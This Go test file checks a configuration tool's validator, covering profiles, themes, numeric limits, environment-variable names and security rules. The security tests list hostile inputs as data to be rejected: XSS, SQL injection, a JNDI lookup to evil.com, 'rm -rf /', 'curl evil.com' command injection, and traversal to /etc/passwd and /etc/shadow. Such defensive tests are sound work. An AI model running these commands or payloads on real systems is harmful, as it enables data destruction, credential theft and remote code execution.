package validation

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"

	"better-claude/domain"
	testfixtures "better-claude/testing"
)

// DomainValidationTestSuite contains tests for comprehensive domain validation
type DomainValidationTestSuite struct {
	suite.Suite
	validator *DomainValidator
	scenarios *testfixtures.TestScenarios
}

func (suite *DomainValidationTestSuite) SetupTest() {
	suite.validator = NewDomainValidator()
	suite.scenarios = testfixtures.NewTestScenarios()
}

// Test Profile Validation Rules
func (suite *DomainValidationTestSuite) TestProfileValidation_ValidProfiles() {
	validProfiles := []string{
		"dev", "development", "prod", "production", "personal", "default",
	}

	for _, profileValue := range validProfiles {
		profile, err := domain.NewProfile(profileValue)
		assert.NoError(suite.T(), err, "Profile %s should be valid", profileValue)

		errors := suite.validator.ValidateProfile(*profile)
		assert.Empty(suite.T(), errors, "Profile %s should pass domain validation", profileValue)
	}
}

func (suite *DomainValidationTestSuite) TestProfileValidation_InvalidProfiles() {
	invalidProfiles := []string{
		"", " ", "invalid", "test", "staging", "dev-test", "INVALID",
	}

	for _, profileValue := range invalidProfiles {
		_, err := domain.NewProfile(profileValue)
		assert.Error(suite.T(), err, "Profile %s should be invalid", profileValue)
	}
}

func (suite *DomainValidationTestSuite) TestProfileValidation_BusinessRules() {
	// Test business rules for profile validation
	devProfile := testfixtures.NewProfileBuilder().WithDev().Build()
	prodProfile := testfixtures.NewProfileBuilder().WithProd().Build()

	// Valid profile transitions
	err := suite.validator.ValidateProfileTransition(devProfile, prodProfile)
	assert.NoError(suite.T(), err, "Dev to prod transition should be allowed")

	// Invalid profile transitions (same profile)
	err = suite.validator.ValidateProfileTransition(devProfile, devProfile)
	assert.Error(suite.T(), err, "Same profile transition should be invalid")
	assert.Contains(suite.T(), err.Error(), "same profile")
}

// Test Configuration Value Validation Rules
func (suite *DomainValidationTestSuite) TestConfigValueValidation_ThemeRules() {
	testCases := []struct {
		theme       string
		shouldError bool
		description string
	}{
		{"dark", false, "valid dark theme"},
		{"light", false, "valid light theme"},
		{"dark-daltonized", false, "valid dark-daltonized theme"},
		{"auto", false, "valid auto theme"},
		{"", true, "empty theme"},
		{"invalid-theme", true, "invalid theme"},
		{"Dark", true, "case sensitive validation"},
		{"LIGHT", true, "uppercase invalid"},
		{"dark ", true, "trailing space"},
		{" dark", true, "leading space"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.theme).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyTheme, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

func (suite *DomainValidationTestSuite) TestConfigValueValidation_ParallelTasksRules() {
	testCases := []struct {
		count       string
		shouldError bool
		description string
	}{
		{"1", false, "minimum valid count"},
		{"50", false, "typical valid count"},
		{"1000", false, "maximum valid count"},
		{"0", true, "zero count"},
		{"-1", true, "negative count"},
		{"1001", true, "above maximum"},
		{"", true, "empty count"},
		{"abc", true, "non-numeric"},
		{"50.5", true, "decimal number"},
		{"50 ", true, "trailing space"},
		{" 50", true, "leading space"},
		{"999999999999999999999", true, "extremely large number"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.count).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyParallelTasksCount, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

func (suite *DomainValidationTestSuite) TestConfigValueValidation_MessageIdleThresholdRules() {
	testCases := []struct {
		threshold   string
		shouldError bool
		description string
	}{
		{"0", false, "minimum valid threshold"},
		{"1000", false, "typical valid threshold"},
		{"60000", false, "maximum valid threshold"},
		{"-1", true, "negative threshold"},
		{"60001", true, "above maximum"},
		{"", true, "empty threshold"},
		{"abc", true, "non-numeric"},
		{"1000.5", true, "decimal number"},
		{"999999999", true, "extremely large number"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.threshold).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyMessageIdleNotifThresholdMs, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

func (suite *DomainValidationTestSuite) TestConfigValueValidation_AutoUpdatesRules() {
	testCases := []struct {
		value       string
		shouldError bool
		description string
	}{
		{"true", false, "valid true"},
		{"false", false, "valid false"},
		{"True", true, "case sensitive"},
		{"FALSE", true, "uppercase"},
		{"yes", true, "yes instead of true"},
		{"no", true, "no instead of false"},
		{"1", true, "numeric 1"},
		{"0", true, "numeric 0"},
		{"", true, "empty value"},
		{"maybe", true, "invalid value"},
		{"true ", true, "trailing space"},
		{" false", true, "leading space"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.value).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyAutoUpdates, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

func (suite *DomainValidationTestSuite) TestConfigValueValidation_NotificationChannelRules() {
	testCases := []struct {
		channel     string
		shouldError bool
		description string
	}{
		{"none", false, "valid none channel"},
		{"iterm2", false, "valid iterm2 channel"},
		{"iterm2_with_bell", false, "valid iterm2 with bell"},
		{"system", false, "valid system channel"},
		{"", true, "empty channel"},
		{"invalid", true, "invalid channel"},
		{"iTerm2", true, "case sensitive"},
		{"iterm2-with-bell", true, "dash instead of underscore"},
		{"terminal", true, "unsupported terminal"},
		{"iterm2 ", true, "trailing space"},
		{" system", true, "leading space"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.channel).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyPreferredNotifChannel, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

func (suite *DomainValidationTestSuite) TestConfigValueValidation_DiffToolRules() {
	testCases := []struct {
		tool        string
		shouldError bool
		description string
	}{
		{"bat", false, "valid bat tool"},
		{"diff", false, "valid diff tool"},
		{"code", false, "valid vscode tool"},
		{"nano", false, "valid nano tool"},
		{"vim", false, "valid vim tool"},
		{"", true, "empty tool"},
		{"invalid", true, "invalid tool"},
		{"BAT", true, "case sensitive"},
		{"vs-code", true, "unsupported variant"},
		{"emacs", true, "unsupported editor"},
		{"bat ", true, "trailing space"},
		{" vim", true, "leading space"},
	}

	for _, tc := range testCases {
		value := testfixtures.NewConfigValueBuilder().WithValue(tc.tool).Build()
		errors := suite.validator.ValidateConfigValue(domain.ConfigKeyDiffTool, value)

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

// Test Configuration Aggregate Validation Rules
func (suite *DomainValidationTestSuite) TestConfigurationValidation_ValidConfigurations() {
	validConfigs := []*domain.Configuration{
		suite.scenarios.ValidDevConfiguration(),
		suite.scenarios.ValidProdConfiguration(),
		suite.scenarios.ValidPersonalConfiguration(),
	}

	for i, config := range validConfigs {
		errors := suite.validator.ValidateConfiguration(config)
		assert.Empty(suite.T(), errors, "Valid configuration %d should pass validation", i)
	}
}

func (suite *DomainValidationTestSuite) TestConfigurationValidation_InvalidConfigurations() {
	invalidConfig := suite.scenarios.ConfigurationWithValidationErrors()

	errors := suite.validator.ValidateConfiguration(invalidConfig)
	assert.NotEmpty(suite.T(), errors, "Invalid configuration should fail validation")
	assert.Greater(suite.T(), len(errors), 0, "Should have validation errors")
}

func (suite *DomainValidationTestSuite) TestConfigurationValidation_BusinessInvariants() {
	// Test business invariants across configuration
	config := suite.scenarios.ValidDevConfiguration()

	// Test that configuration maintains internal consistency
	errors := suite.validator.ValidateBusinessInvariants(config)
	assert.Empty(suite.T(), errors, "Valid configuration should satisfy business invariants")

	// Test profile-specific validation rules
	errors = suite.validator.ValidateProfileSpecificRules(config)
	assert.Empty(suite.T(), errors, "Configuration should satisfy profile-specific rules")
}

// Test Environment Variable Validation Rules
func (suite *DomainValidationTestSuite) TestEnvironmentVariableValidation_ValidVariables() {
	validVars := []struct {
		name  string
		value string
	}{
		{"CUSTOM_VAR", "value"},
		{"CLAUDE_CODE_ENABLE_TELEMETRY", "1"},
		{"EDITOR", "nano"},
		{"DEBUG", "true"},
		{"API_KEY", "secret"},
		{"CONFIG_ENV", "production"},
	}

	for _, vv := range validVars {
		errors := suite.validator.ValidateEnvironmentVariable(vv.name, vv.value)
		assert.Empty(suite.T(), errors, "Environment variable %s should be valid", vv.name)
	}
}

func (suite *DomainValidationTestSuite) TestEnvironmentVariableValidation_SystemVariables() {
	systemVars := []string{
		"PATH", "HOME", "USER", "SHELL", "PWD", "TERM", "LANG", "TZ",
	}

	for _, sysVar := range systemVars {
		errors := suite.validator.ValidateEnvironmentVariable(sysVar, "dangerous_value")
		assert.NotEmpty(suite.T(), errors, "System variable %s should not be allowed", sysVar)
		assert.Contains(suite.T(), errors[0].Message, "system environment variable")
	}
}

func (suite *DomainValidationTestSuite) TestEnvironmentVariableValidation_VariableNaming() {
	testCases := []struct {
		name        string
		shouldError bool
		description string
	}{
		{"VALID_VAR", false, "valid uppercase with underscore"},
		{"ANOTHER_VALID_VAR_123", false, "valid with numbers"},
		{"", true, "empty variable name"},
		{"invalid var", true, "space in name"},
		{"invalid-var", true, "dash in name"},
		{"123INVALID", true, "starting with number"},
		{"invalid.var", true, "dot in name"},
		{"invalid@var", true, "special character in name"},
		{"lowercase_var", true, "lowercase not allowed"},
		{"Mixed_Case_Var", true, "mixed case not allowed"},
	}

	for _, tc := range testCases {
		errors := suite.validator.ValidateEnvironmentVariable(tc.name, "test_value")

		if tc.shouldError {
			assert.NotEmpty(suite.T(), errors, tc.description)
		} else {
			assert.Empty(suite.T(), errors, tc.description)
		}
	}
}

// Test Cross-Field Validation Rules
func (suite *DomainValidationTestSuite) TestCrossFieldValidation_ProfileConsistency() {
	// Test that configuration values are consistent with profile
	devConfig := suite.scenarios.ValidDevConfiguration()

	// Development profile should have specific characteristics
	errors := suite.validator.ValidateProfileConsistency(devConfig)
	assert.Empty(suite.T(), errors, "Dev configuration should be consistent with dev profile")

	// Test inconsistent configuration
	prodConfig := suite.scenarios.ValidProdConfiguration()
	// Force inconsistency by changing profile but keeping prod settings
	prodConfig.SwitchProfile(testfixtures.NewProfileBuilder().WithDev().Build(), "testUser")

	errors = suite.validator.ValidateProfileConsistency(prodConfig)
	// This might or might not be an error depending on business rules
	// The test verifies the validator can detect profile inconsistencies
}

func (suite *DomainValidationTestSuite) TestCrossFieldValidation_PerformanceRules() {
	// Test performance-related validation rules
	config := suite.scenarios.ValidDevConfiguration()

	// High parallel tasks count should be compatible with dev profile
	errors := suite.validator.ValidatePerformanceRules(config)
	assert.Empty(suite.T(), errors, "Dev configuration performance rules should be valid")

	// Test performance warnings for production profile with high task count
	prodConfig := testfixtures.NewConfigurationBuilder().
		WithProdProfile().
		WithParallelTasksCount("100"). // High for production
		Build()

	warnings := suite.validator.ValidatePerformanceRules(prodConfig)
	// Might generate warnings but not errors
	assert.True(suite.T(), len(warnings) >= 0, "Performance validation should complete")
}

// Test Security Validation Rules
func (suite *DomainValidationTestSuite) TestSecurityValidation_MaliciousInputs() {
	maliciousInputs := []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE configs; --",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"{{constructor.constructor('return process')()}",
		"`rm -rf /`",
		"$(curl evil.com)",
		"\x00\x01\x02", // null bytes and control characters
	}

	for _, maliciousInput := range maliciousInputs {
		value := testfixtures.NewConfigValueBuilder().WithValue(maliciousInput).Build()

		// Test against all config keys
		for _, key := range suite.scenarios.CommonConfigKeys() {
			errors := suite.validator.ValidateConfigValue(key, value)
			assert.NotEmpty(suite.T(), errors, "Malicious input '%s' should be rejected for key %s", maliciousInput, key.Value())
		}
	}
}

func (suite *DomainValidationTestSuite) TestSecurityValidation_PathTraversal() {
	pathTraversalInputs := []struct {
		input           string
		expectedMessage string
	}{
		{"../../../etc/passwd", "path traversal"},
		{"..\\..\\..\\windows\\system32\\config\\sam", "path traversal"},
		{"/etc/shadow", "access to system directory not allowed"},
		{"C:\\Windows\\System32\\drivers\\etc\\hosts", "access to system directory not allowed"},
		{"file:///etc/passwd", "access to system directory not allowed"},
		{"\\\\evil.com\\share\\malware.exe", "UNC paths are not allowed"},
	}

	for _, testCase := range pathTraversalInputs {
		errors := suite.validator.ValidatePathInput(testCase.input)
		assert.NotEmpty(suite.T(), errors, "Path traversal input '%s' should be rejected", testCase.input)
		if testCase.expectedMessage != "" {
			assert.Contains(suite.T(), errors[0].Message, testCase.expectedMessage)
		}
	}
}

func (suite *DomainValidationTestSuite) TestSecurityValidation_CommandInjection() {
	commandInjectionInputs := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& curl evil.com",
		"`whoami`",
		"$(id)",
		"\n rm -rf /",
		"\r\n curl evil.com",
	}

	for _, cmdInput := range commandInjectionInputs {
		errors := suite.validator.ValidateCommandInput(cmdInput)
		assert.NotEmpty(suite.T(), errors, "Command injection input '%s' should be rejected", cmdInput)
		assert.Contains(suite.T(), errors[0].Message, "command injection")
	}
}

// Test Comprehensive Validation Scenarios
func (suite *DomainValidationTestSuite) TestComprehensiveValidation_AllRules() {
	// Test that all validation rules work together
	config := suite.scenarios.ValidDevConfiguration()

	allErrors := suite.validator.ValidateAll(config)
	assert.Empty(suite.T(), allErrors, "Comprehensive validation should pass for valid configuration")

	// Test with invalid configuration
	invalidConfig := suite.scenarios.ConfigurationWithValidationErrors()
	allErrors = suite.validator.ValidateAll(invalidConfig)
	assert.NotEmpty(suite.T(), allErrors, "Comprehensive validation should catch all errors")
}

func (suite *DomainValidationTestSuite) TestValidationPerformance_LargeConfiguration() {
	// Test validation performance with large configurations
	perfData := &testfixtures.PerformanceTestData{}
	largeConfigSet := perfData.LargeConfigurationSet(100)

	for i, config := range largeConfigSet {
		errors := suite.validator.ValidateConfiguration(config)
		assert.True(suite.T(), len(errors) >= 0, "Validation should complete for large config %d", i)
	}
}

func (suite *DomainValidationTestSuite) TestValidationErrorMessages_Quality() {
	// Test that validation error messages are helpful and specific
	invalidTheme := testfixtures.NewConfigValueBuilder().WithValue("invalid-theme").Build()
	errors := suite.validator.ValidateConfigValue(domain.ConfigKeyTheme, invalidTheme)

	assert.NotEmpty(suite.T(), errors)
	error := errors[0]

	// Error should be specific and helpful
	assert.Contains(suite.T(), error.Message, "theme")
	assert.Contains(suite.T(), error.Message, "invalid-theme")
	assert.NotEmpty(suite.T(), error.Field)
	assert.NotEmpty(suite.T(), error.Code)
	assert.True(suite.T(), error.Severity >= ValidationSeverityError)
}

func (suite *DomainValidationTestSuite) TestValidationCaching_Performance() {
	// Test that validation can be cached for performance
	config := suite.scenarios.ValidDevConfiguration()

	// First validation
	errors1 := suite.validator.ValidateConfiguration(config)

	// Second validation (should be faster if cached)
	errors2 := suite.validator.ValidateConfiguration(config)

	// Results should be consistent
	assert.Equal(suite.T(), len(errors1), len(errors2))
}

// Run the domain validation test suite
func TestDomainValidationTestSuite(t *testing.T) {
	suite.Run(t, new(DomainValidationTestSuite))
}
